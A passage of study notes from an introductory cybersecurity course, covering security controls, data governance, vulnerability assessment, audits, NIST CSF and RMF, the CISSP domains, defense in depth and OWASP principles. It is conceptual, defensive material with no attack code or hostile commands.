                                                  event

  Password management     Preventative            Reduce password fatigue

  Antivirus (AV) software Corrective              Detect and quarantine
                                                  known threats

  Manual monitoring,      Preventative            Necessary to identify
  maintenance, and                                and manage threats,
  intervention                                    risks, or
                                                  vulnerabilities to
                                                  out-of-date systems
  ----------------------- ----------------------- -----------------------

  ----------------------- ------------------------ -----------------------
  **Physical Controls**                            

  **Control Name**        **Control Type**         **Control Purpose**

  Time-controlled safe    Deterrent                Reduce attack surface
                                                   and [overall
                                                   impact]{.mark} from
                                                   physical threats

  Adequate lighting       Deterrent                Deter threats by
                                                   limiting "hiding"
                                                   places

  Closed-circuit          Preventative/Detective   Closed circuit
  television (CCTV)                                television is both a
                                                   preventative and
                                                   detective control
                                                   because it's presence
                                                   can reduce risk of
                                                   certain types of events
                                                   from occurring, and can
                                                   be used after an event
                                                   to inform on event
                                                   conditions

  Locking cabinets (for   Preventative             Bolster integrity by
  network gear)                                    preventing unauthorized
                                                   personnel and other
                                                   individuals from
                                                   physically accessing or
                                                   modifying network
                                                   infrastructure gear

  Signage indicating      Deterrent                Deter certain types of
  alarm service provider                           threats by making the
                                                   likelihood of a
                                                   successful attack seem
                                                   low

  Locks                   Deterrent/Preventative   Bolster integrity by
                                                   deterring and
                                                   preventing unauthorized
                                                   personnel, individuals
                                                   from physically
                                                   accessing assets

  Fire detection and      Detective/Preventative   Detect fire in physical
  prevention (fire alarm,                          location and prevent
  sprinkler system, etc.)                          damage to physical
                                                   assets such as
                                                   inventory, servers,
                                                   etc.
  ----------------------- ------------------------ -----------------------

### The data lifecycle

The data lifecycle is an important model that security teams consider
when protecting information. It influences how they set policies that
align with business objectives. It also plays an important role in the
technologies security teams use to make information accessible.

In general, the data lifecycle has five stages. Each describe how data
flows through an organization from the moment it is created until it is
no longer useful:

-   Collect

-   Store

-   Use

-   Archive

-   Destroy

![Five stages of the data lifecycle: collection, storage, usage,
archival, and destruction.](media/image613.png){width="6.5in"
height="3.296527777777778in"}

Protecting information at each stage of this process describes the need
to keep it accessible and recoverable should something go wrong.

#### Data governance

Businesses handle massive amounts of data every day. New information is
constantly being collected from internal and external sources. A
structured approach to managing all of this data is the best way to keep
it private and secure.

*Data governance* is a set of processes that define how an organization
manages information. Governance often includes policies that specify how
to keep data private, accurate, available, and secure throughout its
lifecycle.

Effective data governance is a collaborative activity that relies on
people. Data governance policies commonly categorize individuals into a
specific role:

-   **Data owner:** the person that decides who can access, edit, use,
    or destroy their information.

-   **Data custodian**: anyone or anything that\'s responsible for the
    safe handling, transport, and storage of information.

-   **Data steward**: the person or group that maintains and implements
    data governance policies set by an organization.

Businesses store, move, and transform data using a wide range of IT
systems. Data governance policies often assign accountability to data
owners, custodians, and stewards.

**Note:** As a data custodian, you will primarily be  responsible for
maintaining security and privacy rules for your organization.

#### Protecting data at every stage

Most security plans include a specific policy that outlines how
information will be managed across an organization. This is known as a
data governance policy. These documents clearly define procedures that
should be followed to participate in keeping data safe. They place
limits on who or what can access data. Security professionals are
important participants in data governance. As a data custodian, you will
be responsible for ensuring that data isn't damaged, stolen, or misused.

#### Legally protected information

Data is more than just a bunch of 1s and 0s being processed by a
computer. Data can represent someone\'s personal thoughts, actions, and
choices. It can represent a purchase, a sensitive medical decision, and
everything in between. For this reason, data owners should be the ones
deciding whether or not to share their data. As a security professional,
protecting a person\'s data privacy decisions must always be respected.

Securing data can be challenging. In large part, that\'s because data
owners generate more data than they can manage. As a result, data
custodians and stewards sometimes lack direct, explicit instructions on
how they should handle specific types of data. Governments and other
regulatory agencies have bridged this gap by creating rules that specify
the types of information that organizations must protect by default:

-   **PII** is any information used to infer an individual\'s identity.
    Personally identifiable information, or PII, refers to information
    that can be used to contact or locate someone.

-   **PHI** stands for protected health information.  In the U.S., it is
    regulated by the Health Insurance Portability and Accountability Act
    (HIPAA), which defines PHI as "information that relates to the past,
    present, or future physical or mental health or condition of an
    individual." In the EU, PHI has a similar definition but it is
    regulated by the General Data Protection Regulation (GDPR).

-   **SPII** is a specific type of PII that falls under stricter
    handling guidelines. The *S* stands for sensitive, meaning this is a
    type of personally identifiable information that should only be
    accessed on a need-to-know basis, such as a bank account number or
    login credentials.

Overall, it\'s important to protect all types of personal information
from unauthorized use and disclosure.

## Analyzing and Scoring Vulnerabilities

### Vulnerability Assessments 

Weaknesses and flaws are generally found during a vulnerability
assessment. A vulnerability assessment is the internal review process of
an organization\'s security systems. These assessments work similar to
the process of identifying and categorizing vulnerabilities on the CVE
list. The main difference is the organization\'s security team performs,
evaluates, scores, and fixes them on their own. Security analysts play a
key role throughout this process.

Overall, the goal of a vulnerability assessment is to identify weak
points and prevent attacks. They\'re also how security teams determine
whether their security controls meet regulatory standards. Organizations
perform vulnerability assessments a lot. Because companies have so many
assets to protect, security teams sometimes need to select which area to
focus on through vulnerability assessments.

Once they decide what to focus on, vulnerability assessments typically
follow a four-step process.

1.  **[Identification]{.underline}**: The first step is
    **identification**. Here, scanning tools and manual testing are used
    to find vulnerabilities. During the identification step, the goal is
    to understand the current state of a security system, like taking a
    picture of it. A large number of findings usually appear after
    identification.

2.  **[Vulnerability Analysis:]{.underline}** The next step of the
    process is **vulnerability analysis**. During this step, each of the
    vulnerabilities that were identified are tested. By being a digital
    detective, the goal of vulnerability analysis is to find the source
    of the problem.

3.  **[Risk Assessment:]{.underline}** The third step of the process is
    **risk assessment**. During this step of the process, a score is
    assigned to each vulnerability. This score is assigned based on two
    factors: how severe the impact would be if the vulnerability were to
    be exploited and the likelihood of this happening. Vulnerabilities
    uncovered during the first two steps of this process often outnumber
    the people available to fix them. Risk assessments are a way of
    prioritizing resources to handle the vulnerabilities that need to be
    addressed based on their score.

4.  **[Planned Remediation:]{.underline}** The fourth and final step of
    **vulnerability assessment** is remediation. It\'s during this step
    that the vulnerabilities that can impact the organization are
    addressed. Remediation occurs depending on the severity score
    assigned during the risk assessment step. This part of the process
    is normally a joint effort between the security staff and IT teams
    to come up with the best approach to fixing the vulnerabilities that
    were uncovered earlier. Examples of remediation steps might include
    things like enforcing new security procedures, updating operating
    systems, or implementing system patches.

Vulnerability assessments are great for identifying the flaws of a
system. Most organizations use them to search for problems before they
happen. But how do we know where to search? When we get together again,
we\'ll explore how companies figure this out.

### Security audits

A **security audit** is a review of an organization\'s security
controls, policies, and procedures against a set of expectations. Audits
are independent reviews that evaluate whether an organization is meeting
internal and external criteria. Internal criteria include outlined
policies, procedures, and best practices. External criteria include
regulatory compliance, laws, and federal regulations.

Additionally, a security audit can be used to assess an organization\'s
established security controls. As a reminder, **security controls** are
safeguards designed to reduce specific security risks. 

Audits help ensure that security checks are made (i.e., daily monitoring
of security information and event management dashboards), to identify
threats, risks, and vulnerabilities. This helps maintain an
organization's security posture. And, if there are security issues, a
remediation process must be in place.

#### Goals and objectives of an audit

The goal of an audit is to ensure an organization\'s information
technology (IT) practices are meeting industry and organizational
standards. The objective is to identify and address areas of remediation
and growth. Audits provide direction and clarity by identifying what the
current failures are and developing a plan to correct them. 

Security audits must be performed to safeguard data and avoid penalties
and fines from governmental agencies. The frequency of audits is
dependent on local laws and federal compliance regulations.

#### Factors that affect audits

Factors that determine the types of audits an organization implements
include: 

-   Industry type

-   Organization size

-   Ties to the applicable government regulations

-   A business's geographical location

-   A business decision to adhere to a specific regulatory compliance

To review common compliance regulations that different organizations
need to adhere to, refer to [the reading about controls, frameworks, and
compliance](https://www.coursera.org/learn/foundations-of-cybersecurity/supplement/xu4pr/controls-frameworks-and-compliance).

#### The role of frameworks and controls in audits

Along with compliance, it's important to mention the role of frameworks
and controls in security audits. Frameworks such as the National
Institute of Standards and Technology Cybersecurity Framework (NIST CSF)
and the international standard for information security (ISO 27000)
series are designed to help organizations prepare for regulatory
compliance security audits. By adhering to these and other relevant
frameworks, organizations can save time when conducting external and
internal audits. Additionally, frameworks, when used alongside controls,
can support organizations' ability to align with regulatory compliance
requirements and standards. 

#### Audit checklist

It's necessary to create an audit checklist before conducting an audit.
A checklist is generally made up of the following areas of focus:

**Identify the scope of the audit**

-   The audit should:

    -   List assets that will be assessed (e.g., firewalls are
        configured correctly, PII is secure, physical assets are locked,
        etc.) 

    -   Note how the audit will help the organization achieve its
        desired goals

    -   Indicate how often an audit should be performed

    -   Include an evaluation of organizational policies, protocols, and
        procedures to make sure they are working as intended and being
        implemented by employees

**Complete a risk assessment**

-   A risk assessment is used to evaluate identified organizational
    risks related to budget, controls, internal processes, and external
    standards (i.e., regulations).

**Conduct the audit**

-   When conducting an internal audit, you will assess the security of
    the identified assets listed in the audit scope.

**Create a mitigation plan**

-   A mitigation plan is a strategy established to lower the level of
    risk and potential costs, penalties, or other issues that can
    negatively affect the organization's security posture. 

**Communicate results to stakeholders**

-   The end result of this process is providing a detailed report of
    findings, suggested improvements needed to lower the organization\'s
    level of risk, and compliance regulations and standards the
    organization needs to adhere to.

**[Key takeaways]{.underline}**

In this reading you learned more about security audits, including what
they are; why they're conducted; and the role of frameworks, controls,
and compliance in audits. 

Although there is much more to learn about security audits, this
introduction is meant to support your ability to complete an audit of
your own for a self-reflection portfolio activity later in this course.

Resources that you can explore to further develop your understanding of
audits in the cybersecurity space are: 

-   [IT Security Procedural Guide: Audit and Accountability (AU) CIO-IT
    Security-01-08](https://www.gsa.gov/cdnstatic/Audit_and_Accountability_(AU)_%5BCIO-IT_Security_01-08_Rev_6%5D_12-03-2020docx.pdf)

-   [Assessment and Auditing
    Resources](https://www.nist.gov/cyberframework/assessment-auditing-resources)  

-   [IT Disaster Recovery
    Plan](https://www.ready.gov/it-disaster-recovery-plan)

## Vulnerability Management and Security Plans

Security teams spend a lot of time finding vulnerabilities and thinking
of how they can be exploited. They do this with the process known as
vulnerability management. Vulnerability management is the process of
finding and patching vulnerabilities. Vulnerability management helps
keep assets safe. It\'s a method of stopping threats before they can
become a problem.

[Vulnerability management is a four step process]{.underline}.

1.  The first step is to **identify vulnerabilities.**

2.  The next step is to **consider potential exploits** of those
    vulnerabilities.

3.  Third is to **prepare defenses against threats**.

4.  And finally, the fourth step is to **evaluate those defenses**.

When the last step ends, the process starts again. Vulnerability
management happens in a cycle. It\'s a regular part of what security
teams do because there are always new vulnerabilities to be concerned
about.

This is exactly why a diverse set of perspectives is useful! Having a
wide range of backgrounds and experiences only strengthens security
teams and their ability to find exploits. However, even large and
diverse security teams can\'t keep track of everything.

New vulnerabilities are constantly being discovered. These are known as
zero-day exploits. A zero-day is an exploit that was previously unknown.
The term zero-day refers to the fact that the exploit is happening in
real time with zero days to fix it. These kind of exploits are
dangerous. They represent threats that haven\'t been planned for yet.

For example, we can anticipate the possibility of a burglar breaking
into our home. We can plan for this type of threat by having defenses in
place, like locks on the doors and windows. A zero-day exploit would be
something totally unexpected, like the lock on the door falling off from
intense heat. Zero-day exploits are things that don\'t normally come to
mind. For example, this might be a new form of spyware infecting a
popular website. When zero-day exploits happen, they can leave assets
even more vulnerable to threats than they already are.

Vulnerability management is the process of finding vulnerabilities and
fixing their exploits. That\'s why the process is performed regularly at
most organizations. Perhaps the most important step of the process is
identifying vulnerabilities. We\'ll explore this step in more details
next time we get together. I\'ll meet you again then!

### NIST CSF (NIST Cyber Security framework)

**Security frameworks** are guidelines used for building plans to help
mitigate risks and threats to data and privacy. They have four core
components:

1.  Identifying and documenting security goals 

2.  Setting guidelines to achieve security goals 

3.  Implementing strong security processes

4.  Monitoring and communicating results

The National Institute of Standards and Technology (NIST) is a
U.S.-based agency that develops multiple voluntary compliance frameworks
that organizations worldwide can use to help manage risk. The more
aligned an organization is with compliance, the lower the risk.

Examples of frameworks that were introduced previously include the NIST
Cybersecurity Framework (CSF) and the NIST Risk Management Framework
(RMF). 

**Note:** Specifications and guidelines can change depending on the type
of organization you work for.

In addition to the [NIST CSF](https://www.nist.gov/cyberframework) and
[NIST RMF](https://csrc.nist.gov/projects/risk-management/about-rmf),
there are several other controls, frameworks, and compliance standards
that it is important for security professionals to be familiar with to
help keep organizations and the people they serve safe.

In this video, we\'re going to focus on NIST\'s Risk Management
Framework or RMF. As an entry-level analyst, you may not engage in all
of these steps, but it\'s important to be familiar with this framework.
Having a solid foundational understanding of how to mitigate and manage
risks can set yourself apart from other candidates as you begin your job
search in the field of security.

The CSF consists of three main components: the core, it\'s tiers, and
it\'s profiles. 

In any scenario, the U.S. Cybersecurity and Infrastructure Security
Agency (CISA) provides detailed guidance that any organization can use
to implement the CSF. This is a quick overview and summary of their
recommendations:

-   Create a current profile of the security operations and outline the
    specific needs of your business.

-   Perform a risk assessment to identify which of your current
    operations are meeting business and regulatory standards.

-   Analyze and prioritize existing gaps in security operations that
    place the businesses assets at risk.

-   Implement a plan of action to achieve your organization's goals and
    objectives.

**Pro tip**: Always consider current risk, threat, and vulnerability
trends when using the NIST CSF.

You can learn more about implementing the CSF in

this report by CISA that outlines how the framework was applied in the
commercial facilities sector.

<https://www.cisa.gov/sites/default/files/publications/Commercial_Facilities_Sector_Cybersecurity_Framework_Implementation_Guidance_FINAL_508.pdf>

#### Five Core Functions

NIST CSF focuses on five core functions: **identify, protect, detect,
respond, and recover**.

These core functions help organizations manage cybersecurity risks,
implement risk management strategies, and learn from previous mistakes.
Basically, when it comes to security operations, NIST CSF functions are
key for making sure an organization is protected against potential
threats, risks, and vulnerabilities. So let\'s take a little time to
explore how each function can be used to improve an organization\'s
security.

The first core function is **identify**, which is related to the
management of cybersecurity risk and its effect on an organization\'s,
people and assets. For example, as a security analyst, you may be asked
to monitor systems and devices in your organization\'s internal network
to identify potential security issues, like compromised devices on the
network.

The second core function is **protect**, which is the strategy used to
protect an organization through the implementation of policies,
procedures, training, and tools that help mitigate cybersecurity
threats. For example, as a security analyst, you and your team might
encounter new and unfamiliar threats and attacks. For this reason,
studying historical data and making improvements to policies and
procedures is essential.

The third core function is **detect**, which means identifying potential
security incidents and improving monitoring capabilities to increase the
speed and efficiency of detections. For example, as an analyst, you
might be asked to review a new security tool\'s setup to make sure it\'s
flagging low, medium, or high risk, and then alerting the security team
about any potential threats or incidents.

The fourth function is **respond**, which means making sure that the
proper procedures are used to contain, neutralize, and analyze security
incidents, and implement improvements to the security process. As an
analyst, you could be working with a team to collect and organize data
to document an incident and suggest improvements to processes to prevent
the incident from happening again.

The fifth core function is **recover**, which is the process of
returning affected systems back to normal operation. For example, as an
entry-level security analyst, you might work with your security team to
restore systems, data, and assets, such as financial or legal files,
that have been affected by an incident like a breach.

#### Tiers

After the core, the next NIST component we\'ll discuss is its tiers.
These provide security teams with a way to measure performance across
each of the five functions of the core. Tiers range from Level-1 to
Level-4. Level-1, or passive, indicates a function is reaching bare
minimum standards. Level-4, or adaptive, is an indication that a
function is being performed at an exemplary standard. You may have
noticed that CSF tiers aren\'t a yes or no proposition; instead,
there\'s a range of values. That\'s because tiers are designed as a way
of showing organizations what is and isn\'t working with their security
plans.

#### Profiles

Lastly, profiles are the final component of CSF. These provide insight
into the current state of a security plan. One way to think of profiles
is like photos capturing a moment in time. Comparing photos of the same
subject taken at different times can provide useful insights. For
example, without these photos, you might not notice how this tree has
changed. It\'s the same with NIST profiles.

### NIST RMF (NIST Risk Management Framework)

There are seven steps in the RMF: **prepare, categorize, select,
implement, assess, authorize,** and **monitor**.

Let\'s start with **Step one, prepare**. Prepare refers to activities
that are necessary to manage security and privacy risks before a breach
occurs. As an entry-level analyst, you\'ll likely use this step to
monitor for risks and identify controls that can be used to reduce those
risks.

**Step two is categorize**, which is used to develop risk management
processes and tasks. Security professionals then use those processes and
develop tasks by thinking about how the confidentiality, integrity, and
availability of systems and information can be impacted by risk. As an
entry-level analyst, you\'ll need to be able to understand how to follow
the processes established by your organization to reduce risks to
critical assets, such as private customer information.

**Step three is select**. Select means to choose, customize, and capture
documentation of the controls that protect an organization. An example
of the select step would be keeping a playbook up-to-date or helping to
manage other documentation that allows you and your team to address
issues more efficiently.

**Step four is to implement security and privacy plans** for the
organization. Having good plans in place is essential for minimizing the
impact of ongoing security risks. For example, if you notice a pattern
of employees constantly needing password resets, implementing a change
to password requirements may help solve this issue.

**Step five is assess**. Assess means to determine if established
controls are implemented correctly. An organization always wants to
operate as efficiently as possible. So it\'s essential to take the time
to analyze whether the implemented protocols, procedures, and controls
that are in place are meeting organizational needs. During this step,
analysts identify potential weaknesses and determine whether the
organization\'s tools, procedures, controls, and protocols should be
changed to better manage potential risks.

**Step six is authorize**. Authorize means being accountable for the
security and privacy risks that may exist in an organization. As an
analyst, the authorization step could involve generating reports,
developing plans of action, and establishing project milestones that are
aligned to your organization\'s security goals.

**Step seven is monitor**. Monitor means to be aware of how systems are
operating. Assessing and maintaining technical operations are tasks that
analysts complete daily. Part of maintaining a low level of risk for an
organization is knowing how the current systems support the
organization\'s security goals. If the systems in place don\'t meet
those goals, changes may be needed.

Although it may not be your job to establish these procedures, you will
need to make sure they\'re working as intended so that risks to the
organization itself, and the people it serves, are minimized.

## System Hardening

### The eight CISSP security domains

![A picture containing text, circle, screenshot, font Description
automatically generated](media/image614.png){width="6.5in"
height="5.342361111111111in"}

#### Overview of eight domains

Let\'s start with the first domain, **[security and risk
management]{.underline}**. Security and risk management focuses on
defining security goals and objectives, risk mitigation, compliance,
business continuity, and the law. For example, security analysts may
need to update company policies related to private health information if
a change is made to a federal compliance regulation such as the Health
Insurance Portability and Accountability Act, also known as HIPAA.

The second domain is **[asset security]{.underline}**. This domain
focuses on securing digital and physical assets. It\'s also related to
the storage, maintenance, retention, and destruction of data. When
working with this domain, security analysts may be tasked with making
sure that old equipment is properly disposed of and destroyed, including
any type of confidential information.

The third domain is **[security architecture and
engineering]{.underline}**. This domain focuses on optimizing data
security by ensuring effective tools, systems, and processes are in
place. As a security analyst, you may be tasked with configuring a
firewall. A firewall is a device used to monitor and filter incoming and
outgoing computer network traffic. Setting up a firewall correctly helps
prevent attacks that could affect productivity.

The fourth security domain is **[communication and network
security]{.underline}**. This domain focuses on managing and securing
physical networks and wireless communications. As a security analyst,
you may be asked to analyze user behavior within your organization.

Imagine discovering that users are connecting to unsecured wireless
hotspots. This could leave the organization and its employees vulnerable
to attacks. To ensure communications are secure, you would create a
network policy to prevent and mitigate exposure.

Maintaining an organization\'s security is a team effort, and there are
many moving parts. As an entry-level analyst, you will continue to
develop your skills by learning how to mitigate risks to keep people and
data safe.

Let\'s move into the fifth domain: **[identity and access
management]{.underline}**. Identity and access management focuses on
keeping data secure, by ensuring users follow established policies to
control and manage physical assets, like office spaces, and logical
assets, such as networks and applications. Validating the identities of
employees and documenting access roles are essential to maintaining the
organization\'s physical and digital security. For example, as a
security analyst, you may be tasked with setting up employees\' keycard
access to buildings.

There are four main components to IAM.

-   **Identification** is when a user verifies who they are by providing
    a user name, an access card, or biometric data such as a
    fingerprint.

-   **Authentication** is the verification process to prove a person\'s
    identity, such as entering a password or PIN.

-   **Authorization** takes place after a user\'s identity has been
    confirmed and relates to their level of access, which depends on the
    role in the organization.

-   **Accountability** refers to monitoring and recording user actions,
    like login attempts, to prove systems and data are used properly.

The sixth domain is **[security assessment and testing]{.underline}**.
This domain focuses on conducting security control testing, collecting
and analyzing data, and conducting security audits to monitor for risks,
threats, and vulnerabilities. Security analysts may conduct regular
audits of user permissions, to make sure that users have the correct
level of access. For example, access to payroll information is often
limited to certain employees, so analysts may be asked to regularly
audit permissions to ensure that no unauthorized person can view
employee salaries.

The seventh domain is **[security operations]{.underline}**. This domain
focuses on conducting investigations and implementing preventative
measures. Imagine that you, as a security analyst, receive an alert that
an unknown device has been connected to your internal network. You would
need to follow the organization\'s policies and procedures to quickly
stop the potential threat.

The final, eighth domain is **[software development
security]{.underline}**. This domain focuses on using secure coding
practices, which are a set of recommended guidelines that are used to
create secure applications and services. A security analyst may work
with software development teams to ensure security practices are
incorporated into the software development life-cycle. If, for example,
one of your partner teams is creating a new mobile app, then you may be
asked to advise on the password policies or ensure that any user data is
properly secured and managed.

#### Domain one: Security and risk management

All organizations must develop their security posture. [Security posture
is an organization's ability to manage its defense of critical assets
and data and react to change]{.underline}. Elements of the security and
risk management domain that impact an organization\'s security posture
include:

-   Security goals and objectives

-   Risk mitigation processes

-   Compliance

-   Business continuity plans

-   Legal regulations

-   Professional and organizational ethics

Information security, or InfoSec, is also related to this domain and
refers to a set of processes established to secure information. An
organization may use playbooks and implement training as a part of their
security and risk management program, based on their needs and perceived
risk. There are many InfoSec design processes, such as:

-   Incident response

-   Vulnerability management

-   Application security

-   Cloud security

-   Infrastructure security

As an example, a security team may need to alter how personally
identifiable information (PII) is treated in order to adhere to the
European Union\'s General Data Protection Regulation (GDPR).

#### Domain two: Asset security

Asset security involves managing the cybersecurity processes of
organizational assets, including the storage, maintenance, retention,
and destruction of physical and virtual data. Because the loss or theft
of assets can expose an organization and increase the level of risk,
keeping track of assets and the data they hold is essential. Conducting
a security impact analysis, establishing a recovery plan, and managing
data exposure will depend on the level of risk associated with each
asset. Security analysts may need to store, maintain, and retain data by
creating backups to ensure they are able to restore the environment if a
security incident places the organization's data at risk.

#### Domain three: Security architecture and engineering 

This domain focuses on managing data security. Ensuring effective tools,
systems, and processes are in place helps protect an organization's
assets and data. Security architects and engineers create these
processes.

One important aspect of this domain is the concept of **shared
responsibility**. [Shared responsibility means all individuals involved
take an active role in lowering risk during the design of a security
system]{.underline}. Additional design principles related to this
domain, which are discussed later in the program, include:

-   Threat modeling

-   Least privilege

-   Defense in depth

-   Fail securely

-   Separation of duties

-   Keep it simple

-   Zero trust

-   Trust but verify

An example of managing data is the use of a security information and
event management (SIEM) tool to monitor for flags related to unusual
login or user activity that could indicate a threat actor is attempting
to access private data.

#### Domain four: Communication and network security

This domain focuses on managing and securing physical networks and
wireless communications. This includes on-site, remote, and cloud
communications. 

Organizations with remote, hybrid, and on-site work environments must
ensure data remains secure, but managing external connections to make
certain that remote workers are securely accessing an organization's
networks is a challenge. Designing network security controls---such as
restricted network access---can help protect users and ensure an
organization's network remains secure when employees travel or work
outside of the main office.

#### Domain five: Identity and access management

The identity and access management (IAM) domain focuses on keeping data
secure. It does this by ensuring user identities are trusted and
authenticated and that access to physical and logical assets is
authorized. This helps prevent unauthorized users, while allowing
authorized users to perform their tasks.

Essentially, IAM uses what is referred to as the principle of least
privilege, which is the concept of granting only the minimal access and
authorization required to complete a task. As an example, a
cybersecurity analyst might be asked to ensure that customer service
representatives can only view the private data of a customer, such as
their phone number, while working to resolve the customer\'s issue; then
remove access when the customer\'s issue is resolved.

Security is more than simply combining processes and technologies to
protect assets. Instead, security is about ensuring that these processes
and technologies are creating a secure environment that supports a
defense strategy. A key to doing this is implementing two fundamental
security principles that limit access to organizational resources:

-   The **principle of least privilege** in which a user is only granted
    the minimum level of access and authorization required to complete a
    task or function.

-   **Separation of duties**, which is the principle that users should
    not be given levels of authorization that would allow them to misuse
    a system.

Both principles typically support each other. For example, according to
least privilege, a person who needs permission to approve purchases from
the IT department shouldn\'t have the permission to approve purchases
from every department. Likewise, according to separation of duties, the
person who can approve purchases from the IT department should be
different from the person who can input new purchases.

In other words, least privilege *limits* *the access* that an individual
receives, while separation of duties *divides responsibilities* among
multiple people to prevent any one person from having too much control.

Previously, you learned about the authentication, authorization, and
accounting (AAA) framework. Many businesses used this model to implement
these two security principles and manage user access. In this reading,
you'll learn about the other major framework for managing user access,
identity and access management (IAM). You will learn about the
similarities between AAA and IAM and how they\'re commonly implemented.

#### Domain six: Security assessment and testing 

The security assessment and testing domain focuses on identifying and
mitigating risks, threats, and vulnerabilities. Security assessments
help organizations determine whether their internal systems are secure
or at risk. Organizations might employ penetration testers, often
referred to as "pen testers," to find vulnerabilities that could be
exploited by a threat actor. 

This domain suggests that organizations conduct security control
testing, as well as collect and analyze data. Additionally, it
emphasizes the importance of conducting security audits to monitor for
and reduce the probability of a data breach. To contribute to these
types of tasks, cybersecurity professionals may be tasked with auditing
user permissions to validate that users have the correct levels of
access to internal systems.

#### Domain seven: Security operations 

The security operations domain focuses on the investigation of a
potential data breach and the implementation of preventative measures
after a security incident has occurred. This includes using strategies,
processes, and tools such as:

-   Training and awareness

-   Reporting and documentation

-   Intrusion detection and prevention

-   SIEM tools   

-   Log management

-   Incident management

-   Playbooks

-   Post-breach forensics

-   Reflecting on lessons learned

The cybersecurity professionals involved in this domain work as a team
to manage, prevent, and investigate threats, risks, and vulnerabilities.
These individuals are trained to handle active attacks, such as large
amounts of data being accessed from an organization\'s internal network,
outside of normal working hours. Once a threat is identified, the team
works diligently to keep private data and information safe from threat
actors.  

#### Domain eight: Software development security

The software development security domain is focused on using secure
programming practices and guidelines to create secure applications.
Having secure applications helps deliver secure and reliable services,
which helps protect organizations and their users.

Security must be incorporated into each element of the software
development life cycle, from design and development to testing and
release. To achieve security, the software development process must have
security in mind at each step. Security cannot be an afterthought.

Performing application security tests can help ensure vulnerabilities
are identified and mitigated accordingly. Having a system in place to
test the programming conventions, software executables, and security
measures embedded in the software is necessary. Having quality assurance
and pen tester professionals ensure the software has met security and
performance standards is also an essential part of the software
development process. For example, an entry-level analyst working for a
pharmaceutical company might be asked to make sure encryption is
properly configured for a new medical device that will store private
patient data. 

### Policies, Standards, and Procedures

**Security plans consist of three basic elements**: [policies,
standards, and procedures.]{.underline}

These three elements are how companies share their security plans. These
words tend to be used interchangeably outside of security, but you\'ll
soon discover that they each have a very specific meaning and function
in this context.

**A [policy]{.underline}** in security is a set of rules that reduce
risk and protects information. Policies are the foundation of every
security plan. They give everyone in and out of an organization guidance
by addressing questions like, what are we protecting and why? Policies
focus on the strategic side of things by identifying the scope,
objectives, and limitations of a security plan. For instance, newly
hired employees at many companies are required to sign off on acceptable
use policy, or AUP. These provisions outline secure ways that an
employee may access corporate systems.

**[Standards]{.underline}** are the next part. These have a tactical
function, as they concern how well we\'re protecting assets. In
security, standards are references that inform how to set policies. A
good way to think of standards is that they create a point of reference.
For example, many companies use the password management standard
identified in NIST Special Publication 800-63B to improve their security
policies by specifying that employees\' passwords must be at least eight
characters long.

The last part of a plan is its **[procedures]{.underline}**. Procedures
are step-by-step instructions to perform a specific security task.
Organizations usually keep multiple procedure documents that are used
throughout the company, like how employees can choose secure passwords,
or how they can securely reset a password if it\'s been locked. Sharing
clear and actionable procedures with everyone creates accountability,
consistency, and efficiency across an organization.

Policies, standards, and procedures vary widely from one company to
another because they are tailored to each organization\'s goals. Simply
understanding the structure of security plans is a great start. For now,
I hope you have a clearer picture of what policies, standards, and
procedures are, and how they are essential to making security a team
effort.

### Defense in Depth (five layers)

A **layered defense** is difficult to penetrate. When one barrier fails,
another takes its place to stop an attack. Defense in depth is a
security model that makes use of this concept. It\'s a layered approach
to vulnerability management that reduces risk. Defense in depth is
commonly referred to as the [castle approach]{.underline} because it
resembles the layered defenses of a castle.

The defense in depth concept can be used to protect any asset. It\'s
mainly used in cybersecurity to protect information using a five layer
design. Each layer features a number of security controls that protect
information as it travels in and out of the model.

**[Layer 1: Perimeter Layer]{.underline}**

The first layer of defense in depth is the perimeter layer. This layer
includes some technologies that we\'ve already explored, like usernames
and passwords. Mainly, this is a user authentication layer that filters
external access. Its function is to only allow access to trusted
partners to reach the next layer of defense.

**[Layer 2: Network Layer]{.underline}**

Second, the network layer is more closely aligned with authorization.
The network layer is made up of other technologies like network
firewalls and others.

**[Layer 3: Endpoint Layer]{.underline}**

Next, is the endpoint layer. Endpoints refer to the devices that have
access on a network. They could be devices like a laptop, desktop, or a
server. Some examples of technologies that protect these devices are
anti-virus software.

**[Layer 4: Application Layer]{.underline}**

After that, we get to the application layer. This includes all the
interfaces that are used to interact with technology. At this layer,
security measures are programmed as part of an application. One common
example is multi-factor authentication. You may be familiar with having
to enter both your password and a code sent by SMS. This is part of the
application layer of defense.

**[Layer 5: Data Layer]{.underline}**

And finally, the fifth layer of defense is the data layer. At this
layer, we\'ve arrived at the critical data that must be protected, like
personally identifiable information. One security control that is
important here in this final layer of defense is asset classification.

Like I mentioned earlier, information passes in and out of each of these
five layers whenever it\'s exchanged over a network. There are many more
security controls aside from the few that I mentioned that are part of
the defense in depth model. A lot of businesses design their security
systems using the defense in-depth model. Understanding this framework
hopefully gives you a better sense of how an organization\'s security
controls work together to protect important assets.

### OWASP: Security Principles

#### Security principles

In the workplace, security principles are embedded in your daily tasks.
Whether you are analyzing logs, monitoring a security information and
event (SIEM) dashboard, or using a [vulnerability
scanner](https://csrc.nist.gov/glossary/term/vulnerability_scanner), you
will use these principles in some way. 

Previously, you were introduced to several OWASP security principles.
These included:

-   **Minimize attack surface area**: Attack surface refers to all the
    potential vulnerabilities a threat actor could exploit.

-   **Principle of least privilege**: Users have the least amount of
    access required to perform their everyday tasks.

-   **Defense in depth**: Organizations should have varying security
    controls that mitigate risks and threats.

-   **Separation of duties**: Critical actions should rely on multiple
    people, each of whom follow the principle of least privilege. 

-   **Keep security simple**: Avoid unnecessarily complicated solutions.
    Complexity makes security difficult. 

-   **Fix security issues correctly**: When security incidents occur,
    identify the root cause, contain the impact, identify
    vulnerabilities, and conduct tests to ensure that remediation is
    successful.

#### Additional OWASP security principles

Next, you'll learn about four additional OWASP security principles that
cybersecurity analysts and their teams use to keep organizational
operations and people safe.

##### Establish secure defaults

This principle means that the optimal security state of an application
is also its default state for users; it should take extra work to make
the application insecure. 

##### Fail securely

Fail securely means that when a control fails or stops, it should do so
by defaulting to its most secure option. For example, when a firewall
fails it should simply close all connections and block all new ones,
rather than start accepting everything.

##### Don't trust services

Many organizations work with third-party partners. These outside
partners often have different security policies than the organization
does. And the organization shouldn't explicitly trust that their
partners' systems are secure. For example, if a third-party vendor
tracks reward points for airline customers, the airline should ensure
that the balance is accurate before sharing that information with their
customers.

##### Avoid security by obscurity

The security of key systems should not rely on keeping details hidden.
Consider the following example from OWASP (2016):

The security of an application should not rely on keeping the source
code secret. Its security should rely upon many other factors, including
reasonable password policies, defense in depth, business transaction
